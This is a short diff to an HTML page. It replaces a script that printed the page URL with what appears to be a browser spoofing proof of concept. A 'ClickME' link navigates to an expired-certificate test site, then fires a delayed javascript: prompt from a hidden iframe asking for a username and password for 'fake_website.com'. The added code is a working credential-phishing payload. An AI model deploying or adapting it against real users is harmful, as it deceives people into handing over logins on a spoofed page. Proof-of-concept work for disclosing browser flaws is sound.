@@ -1,5 +1,14 @@
 <html>
-<body>
-<script>document.write("<b>Current URL</b> : " + document.baseURI);</script>
-</body>
+  <body>
+    <script>
+    function pwn() {
+        win = window.open('https://expired.badssl.com', '_self')
+        setTimeout(`document.getElementById("nop").src = 'javascript:prompt("In order to access fake_website.com,Please enter your username and password", "Username / Password");';`, 3333);
+    }
+    </script>
+
+    <iframe style="display:none" id="nop" src=""></iframe>
+
+    <a href="#" onclick="pwn();"><h1>ClickME :)</h1></a>
+  </body>
 </html>
